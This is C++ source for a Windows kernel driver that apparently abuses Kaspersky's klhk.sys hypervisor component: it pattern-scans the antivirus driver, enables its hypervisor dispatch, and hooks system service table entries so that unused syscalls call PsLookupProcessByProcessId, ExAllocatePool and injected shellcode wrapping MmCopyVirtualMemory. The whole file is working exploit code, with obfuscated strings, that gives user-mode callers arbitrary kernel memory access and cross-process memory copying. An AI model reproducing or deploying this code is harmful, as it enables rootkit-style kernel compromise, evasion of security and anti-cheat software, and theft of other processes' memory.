#include "general.h"

using SetHvmEvent_t = NTSTATUS(*)();

static VOID*** systemDispatchArray;
static UINT* ssdtServiceCount;
static UINT* shadowSsdtServiceCount;
static UINT* provider;

UINT GetServiceCountSsdt()
{
	return ssdtServiceCount ? *ssdtServiceCount : 0;
}

UINT GetServiceCountShadow()
{
	return shadowSsdtServiceCount ? *shadowSsdtServiceCount : 0;
}

BOOL HookSsdtRoutine(USHORT index, VOID* dest, VOID** original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !dest || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt();
	if (!svcCount || index >= svcCount)
		return false;

	*original = *systemDispatchArray[index];
	*systemDispatchArray[index] = dest;

	PROTECT_END();
	return true;
}

BOOL UnhookSsdtRoutine(USHORT index, VOID* original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt();
	if (!svcCount || index >= svcCount || *systemDispatchArray[index] == original)
		return false;

	*systemDispatchArray[index] = original;

	PROTECT_END();
	return true;
}

BOOL HookShadowSsdtRoutine(USHORT index, VOID* dest, VOID** original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !dest || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt(), svcCountShadowSsdt = GetServiceCountShadow();
	if (!svcCount || !svcCountShadowSsdt)
		return false;

	UINT indexDispatchTable = (index - 0x1000) + svcCount;
	UINT dispatchTableLimit = svcCount + svcCountShadowSsdt;
	if (indexDispatchTable >= dispatchTableLimit)
		return false;

	*original = *systemDispatchArray[indexDispatchTable];
	*systemDispatchArray[indexDispatchTable] = dest;

	PROTECT_END();
	return true;
}

BOOL UnhookShadowSsdtRoutine(USHORT index, VOID* original)
{
	PROTECT_ULTRA();
	if (!systemDispatchArray || !original)
		return false;

	UINT svcCount = GetServiceCountSsdt(), svcCountShadowSsdt = GetServiceCountShadow();
	if (!svcCount || !svcCountShadowSsdt)
		return false;

	UINT indexDispatchTable = (index - 0x1000) + svcCount;
	UINT dispatchTableLimit = svcCount + svcCountShadowSsdt;
	if (indexDispatchTable >= dispatchTableLimit || *systemDispatchArray[indexDispatchTable] == original)
		return false;

	*systemDispatchArray[indexDispatchTable] = original;

	PROTECT_END();
	return true;
}

PVOID GetMmCopyVirtualMemoryWrapper()
{
	PROTECT_ULTRA();
	BYTE code[] = {
		0x40, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0xB8, 0x97, 0x34, 0x89, 0x7E, 0x9F, 0x08, 0x00, 0x00, 0x4D, 0x8B,
		0xD1, 0x4D, 0x8B, 0xD8, 0x48, 0x8B, 0xDA, 0x48, 0x3B, 0xC8, 0x74, 0x07, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xEB,
		0x3C, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0xC2, 0x4C, 0x8B, 0x4C, 0x24, 0x70, 0x49,
		0x8B, 0xD3, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0xCB, 0x8A, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x88,
		0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xB8, 0xAD, 0xDE, 0xED,
		0xFE, 0xAD, 0xDE, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0xC3
	};

	*reinterpret_cast<PVOID*>(code + 0x57) = &imports::MmCopyVirtualMemory;

	PVOID buffer = ExAllocatePool(NonPagedPoolExecute, sizeof(code));
	if (!buffer)
		return nullptr;

	memcpy(buffer, code, sizeof(code));
	PROTECT_END();
	return buffer;
}

extern "C" NTSTATUS DriverEntry(VOID * driver, VOID * registry)
{
	PROTECT_ULTRA();
	UNREFERENCED_PARAMETER(driver);
	UNREFERENCED_PARAMETER(registry);

	PCHAR kasperskyBase = utils::FindTargetModule(E("klhk.sys"));
	if (!kasperskyBase)
		return STATUS_KASPERSKY_BASE_NOT_FOUND;

	SetHvmEvent_t setHvmEvent = reinterpret_cast<SetHvmEvent_t>(utils::FindPatternImage(kasperskyBase, EC("\x48\x83\xEC\x38\x48\x83\x3D"), EC("xxxxxxx")));
	if (!setHvmEvent)
		return STATUS_SCAN_0_NOT_FOUND;

	PCHAR scan = static_cast<PCHAR>(utils::FindPatternSection(kasperskyBase, EC("_hvmcode"), EC("\x4C\x8D\x0D\x00\x00\x00\x00\x4D"), EC("xxx????x")));
	if (!scan)
		return STATUS_SCAN_1_NOT_FOUND;

	systemDispatchArray = reinterpret_cast<VOID***>(scan + *reinterpret_cast<INT*>(scan + 0x3) + 0x7);

	scan = static_cast<PCHAR>(utils::FindPatternImage(kasperskyBase, EC("\x89\x0D\x00\x00\x00\x00\x8B\xFB"), EC("xx????xx")));
	if (!scan)
		return STATUS_SCAN_2_NOT_FOUND;

	ssdtServiceCount = reinterpret_cast<UINT*>(scan + *reinterpret_cast<INT*>(scan + 0x2) + 0x6);

	scan = static_cast<PCHAR>(utils::FindPatternImage(kasperskyBase, EC("\x89\x05\x00\x00\x00\x00\x8B\xFB"), EC("xx????xx")));
	if (!scan)
		return STATUS_SCAN_3_NOT_FOUND;

	shadowSsdtServiceCount = reinterpret_cast<UINT*>(scan + *reinterpret_cast<INT*>(scan + 0x2) + 0x6);

	scan = static_cast<PCHAR>(utils::FindPatternImage(kasperskyBase, EC("\x39\x2D\x00\x00\x00\x00\x75"), EC("xx????x")));
	if (!scan)
		return STATUS_SCAN_4_NOT_FOUND;

	provider = reinterpret_cast<unsigned int*>(scan + *reinterpret_cast<int*>(scan + 0x2) + 0x6);

	*provider = 4;
	NTSTATUS status = setHvmEvent();
	if (!NT_SUCCESS(status))
		return status;

	PVOID shellcode = GetMmCopyVirtualMemoryWrapper();
	if (!shellcode)
		return STATUS_SHELLCODE_FAILED;

	VOID* dummy = nullptr;
	bool hooked = HookSsdtRoutine(indexes::NtSetCachedSigningLevelIndex, &PsLookupProcessByProcessId, &dummy);
	if (!hooked)
		return STATUS_HOOK_0_FAILED;

	hooked = HookSsdtRoutine(indexes::NtSetBootOptionsIndex, &ExAllocatePool, &dummy);
	if (!hooked)
		return STATUS_HOOK_1_FAILED;

	hooked = HookSsdtRoutine(indexes::NtCreateProfileExIndex, shellcode, &dummy);
	if (!hooked)
		return STATUS_HOOK_2_FAILED;

	PROTECT_END();
	return STATUS_SUCCESS;
}